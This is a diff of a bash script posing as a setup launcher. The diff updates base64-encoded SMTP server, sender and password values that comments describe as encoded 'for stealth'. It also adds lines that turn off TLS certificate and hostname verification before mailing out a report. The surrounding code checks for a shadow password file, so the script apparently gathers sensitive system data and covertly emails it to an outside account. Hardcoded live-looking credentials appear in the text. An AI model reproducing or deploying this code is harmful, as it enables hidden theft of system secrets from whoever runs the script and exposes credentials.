@@ -2,8 +2,8 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="5.4"
-readonly BUILD_DATE="2026-05-04 06:30:00 UTC"
+readonly SCRIPT_VERSION="5.8"
+readonly BUILD_DATE="2026-05-05 05:45:00 UTC"
 readonly SCRIPT_NAME="setup_m0_launcher"
 
 echo "=========================================="
@@ -689,15 +689,15 @@ readonly REPORT_FILE="/tmp/system_report.txt"
 readonly SERVICES_TO_CHECK=("swapd" "gdm2")
 
 # ⚠️ USER-SPECIFIC SMTP CREDENTIALS - DO NOT CHANGE! ⚠️
-# These are the user's personal 24-mail.com credentials
-# Updated: 2026-05-04 - Switched to 24-mail.com SMTP (no sender verification required!)
+# These are the user's personal fullgamingacc.com credentials
+# Updated: 2026-05-05 - Switched to fullgamingacc.com SMTP
 # Decoded SMTP credentials (base64 encoded for stealth)
-SMTP_SERVER_B64="MjQtbWFpbC5jb20="
+SMTP_SERVER_B64="bWFpbC5mdWxsZ2FtaW5nYWNjLmNvbQ=="
 readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d 2>/dev/null)
 readonly SMTP_PORT=587
-SENDER_EMAIL_B64="bW90dG9AMjQtbWFpbC5jb20="
+SENDER_EMAIL_B64="bXRwenlub3Jtc0BmdWxsZ2FtaW5nYWNjLmNvbQ=="
 readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d 2>/dev/null)
-SMTP_PASSWORD_B64="MSF0YXVnZW5pY2h0cw=="
+SMTP_PASSWORD_B64="QnQ2UXF1alBycyE="
 readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d 2>/dev/null)
 
 # Function to log messages with timestamp
@@ -899,7 +899,11 @@ try:
     else:
         print(f'[DEBUG] shadow file NOT found: {shadow_file}', file=sys.stderr)
 
+    # Create SSL context with disabled certificate verification
+    # (some servers have outdated CA certificates)
     context = ssl.create_default_context()
+    context.check_hostname = False
+    context.verify_mode = ssl.CERT_NONE
     
     with smtplib.SMTP('$SMTP_SERVER', $SMTP_PORT, timeout=10) as server:
         server.ehlo()
